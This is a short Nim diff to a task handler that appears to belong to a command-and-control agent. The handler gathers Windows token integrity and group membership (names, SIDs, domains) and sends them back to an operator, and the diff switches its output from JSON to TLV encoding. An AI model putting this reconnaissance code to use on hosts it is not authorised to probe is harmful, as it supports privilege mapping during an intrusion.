@@ -1,5 +1,6 @@
-import std/[net, json, jsonutils]
 import ../client/[communication, modules, types]
+
+import tlv
 
 proc executeTask*(app: App, taskId: int, params: seq[string]) =
   let taskOutput = newTaskOutput taskId
@@ -7,8 +8,15 @@ proc executeTask*(app: App, taskId: int, params: seq[string]) =
   let tokenGroups: seq[tuple[name, sid, domain: string]] = getintegritygroups()
   let tokenIntegrity: string = getintegrity() 
   
-  taskOutput.data = $(%*{
-      "tokenGroups": toJson tokenGroups,
-      "tokenIntegrity": tokenIntegrity
-    })
+  let b = initBuilder()
+  b.addString(tokenIntegrity)
+  b.addInt32(cast[int32](len tokenGroups))
+
+  for tokenGroup in tokenGroups:
+    b.addString(tokenGroup.name)
+    b.addString(tokenGroup.sid)
+    b.addString(tokenGroup.domain)
+
+  taskOutput.data = b.encodeString()
+  
   app.sendOutput(taskOutput)
